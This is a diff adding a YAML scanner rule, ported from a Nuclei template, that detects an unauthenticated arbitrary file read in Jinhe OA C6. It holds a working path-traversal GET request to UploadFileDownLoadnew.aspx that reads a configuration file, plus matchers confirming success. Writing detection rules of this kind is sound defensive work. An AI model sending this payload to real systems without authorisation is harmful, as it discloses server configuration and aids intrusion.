@@ -1,0 +1,32 @@
+schema_version: 1
+id: "cortex.community:jinhe-oa-c6-upload-lfi"
+rule_version: "1.0.0"
+requires:
+  engine_api: 1
+  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+info:
+  name: "Jinhe OA_C6_UploadFileDownLoadnew - Arbitrary File Read"
+  description: "There is an arbitrary file reading vulnerability in the UploadFileDownLoadnew.aspx interface of Jinhe OA C6. An unauthenticated attacker can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, etc., causing the website to be in Extremely unsafe state. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
+  references:
+    - "https://github.com/wy876/POC/blob/main/%E9%87%91%E5%92%8COA_C6_UploadFileDownLoadnew%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
+  cwes: [23]
+  tags: ["jinhe-oa-c6", "misconfig", "vuln", "nuclei", "auto-ported", "signal"]
+  remediation: "See the referenced advisory / template source for remediation."
+finding:
+  sink_type: "VULNERABLE_COMPONENT"
+  impact: "INFORMATION_DISCLOSURE"
+  severity: "High"
+  root_cause: "nuclei-ported-signal"
+execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
+steps:
+  - id: "probe0"
+    request: { method: "GET", path: "/c6/JHSoft.Web.CustomQuery/UploadFileDownLoadnew.aspx/?FilePath=../Resource/JHFileConfig.ini" }
+proof:
+  kind: "signal.v1"
+  assertions:
+    all:
+      - all:
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "MaxFolderTotal=1" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "[JHFile]" } }
+          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "FolderTotal=1" } }
+      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
